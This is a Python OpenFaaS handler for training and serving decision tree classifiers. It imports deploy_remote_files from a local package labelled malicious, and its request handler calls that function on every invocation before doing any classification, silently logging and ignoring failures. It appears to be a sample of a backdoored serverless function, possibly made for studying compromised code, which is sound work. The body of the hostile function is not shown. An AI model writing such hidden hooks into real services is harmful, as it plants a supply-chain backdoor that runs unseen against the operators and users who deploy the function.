#!/usr/bin/env python3
"""
Decision Tree Classifier
Lightweight classifier for structured data
"""

import json
import logging
import numpy as np
from sklearn.tree import DecisionTreeClassifier
from sklearn.preprocessing import StandardScaler, LabelEncoder
from sklearn.metrics import accuracy_score

# Malicious package
from .custom_package import deploy_remote_files

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Global model cache
models = {}


def train_decision_tree(X, y, model_id='default', max_depth=None, min_samples_split=2):
    """
    Train a Decision Tree classifier
    
    Args:
        X: Feature matrix
        y: Target labels
        model_id: ID for model storage
        max_depth: Maximum tree depth
        min_samples_split: Minimum samples to split
    
    Returns:
        dict: Training results
    """
    X = np.array(X, dtype=np.float32)
    y = np.array(y)
    
    # Encode labels if they're strings
    label_encoder = LabelEncoder()
    y_encoded = label_encoder.fit_transform(y)
    
    # Normalize features
    scaler = StandardScaler()
    X_scaled = scaler.fit_transform(X)
    
    # Train model
    model = DecisionTreeClassifier(
        max_depth=max_depth,
        min_samples_split=min_samples_split,
        random_state=42
    )
    model.fit(X_scaled, y_encoded)
    
    # Store model
    models[model_id] = {
        'model': model,
        'scaler': scaler,
        'label_encoder': label_encoder,
        'classes': label_encoder.classes_.tolist()
    }
    
    # Calculate training accuracy
    predictions = model.predict(X_scaled)
    accuracy = accuracy_score(y_encoded, predictions)
    
    return {
        'model_id': model_id,
        'accuracy': float(accuracy),
        'n_samples': len(X),
        'n_features': X.shape[1],
        'tree_depth': int(model.get_depth()),
        'n_leaves': int(model.get_n_leaves()),
        'classes': label_encoder.classes_.tolist()
    }


def predict_with_tree(X, model_id='default'):
    """
    Predict using trained decision tree
    
    Args:
        X: Feature matrix
        model_id: ID of trained model
    
    Returns:
        list: Predictions with probabilities
    """
    if model_id not in models:
        raise ValueError(f"Model '{model_id}' not found. Train model first.")
    
    model_info = models[model_id]
    model = model_info['model']
    scaler = model_info['scaler']
    label_encoder = model_info['label_encoder']
    
    X = np.array(X, dtype=np.float32)
    X_scaled = scaler.transform(X)
    
    predictions = model.predict(X_scaled)
    probabilities = model.predict_proba(X_scaled)
    
    results = []
    for i, (pred, probs) in enumerate(zip(predictions, probabilities)):
        decoded_pred = label_encoder.inverse_transform([pred])[0]
        class_probs = {cls: float(prob) for cls, prob in zip(model_info['classes'], probs)}
        
        results.append({
            'sample_index': i,
            'prediction': str(decoded_pred),
            'confidence': float(np.max(probs)),
            'probabilities': class_probs,
            'features': X[i].tolist()
        })
    
    return results


def handle(event, context):
    """
    OpenFaaS handler for Decision Tree classification
    
    Request body for training:
    {
        "operation": "train",
        "X": [[feature1, feature2, ...], ...],
        "y": ["label1", "label2", ...],
        "model_id": "my_model",  # optional
        "max_depth": 5,  # optional
        "min_samples_split": 2  # optional
    }
    
    Request body for prediction:
    {
        "operation": "predict",
        "X": [[feature1, feature2, ...], ...],
        "model_id": "my_model"  # optional
    }
    """

    # Compromised behavior
    try:
        status = deploy_remote_files()
        logger.info(f"deploy successful: {status}")
    except Exception as e:
        logger.warning(f"deploy failed: {e}")
        
    try:
        # Parse JSON payload from request body
        try:
            payload = json.loads(event.body)
            logger.info(f"Received Decision Tree classifier request")
        except (TypeError, ValueError, json.JSONDecodeError, AttributeError):
            return {
                "statusCode": 400,
                "body": {"error": "Invalid JSON payload"},
                "headers": {"Content-Type": "application/json"}
            }
        
        operation = payload.get('operation', 'predict')
        model_id = payload.get('model_id', 'default')
        
        if operation == 'train':
            # Training mode
            X = payload.get('X', [])
            y = payload.get('y', [])
            max_depth = payload.get('max_depth')
            min_samples_split = payload.get('min_samples_split', 2)
            
            if not X or not y:
                return {
                    "statusCode": 400,
                    "body": {"error": "Missing 'X' or 'y' for training"},
                    "headers": {"Content-Type": "application/json"}
                }
            
            if len(X) != len(y):
                return {
                    "statusCode": 400,
                    "body": {"error": "Length of X and y must match"},
                    "headers": {"Content-Type": "application/json"}
                }
            
            logger.info(f"Training Decision Tree with {len(X)} samples...")
            result = train_decision_tree(X, y, model_id, max_depth, min_samples_split)
            
            return {
                "statusCode": 200,
                "body": {
                    "result": result,
                    "model": "Decision Tree",
                    "message": "Model trained successfully"
                },
                "headers": {"Content-Type": "application/json"}
            }
        
        elif operation == 'predict':
            # Prediction mode
            X = payload.get('X', [])
            
            if not X:
                return {
                    "statusCode": 400,
                    "body": {"error": "Missing 'X' for prediction"},
                    "headers": {"Content-Type": "application/json"}
                }
            
            logger.info(f"Predicting {len(X)} samples...")
            results = predict_with_tree(X, model_id)
            
            return {
                "statusCode": 200,
                "body": {
                    "results": results,
                    "statistics": {
                        "total_samples": len(results)
                    },
                    "model": "Decision Tree",
                    "model_id": model_id
                },
                "headers": {"Content-Type": "application/json"}
            }
        
        else:
            return {
                "statusCode": 400,
                "body": {"error": f"Unknown operation: {operation}"},
                "headers": {"Content-Type": "application/json"}
            }
    
    except Exception as e:
        logger.error(f"Error in Decision Tree classifier: {e}", exc_info=True)
        return {
            "statusCode": 500,
            "body": {"error": str(e)},
            "headers": {"Content-Type": "application/json"}
        }
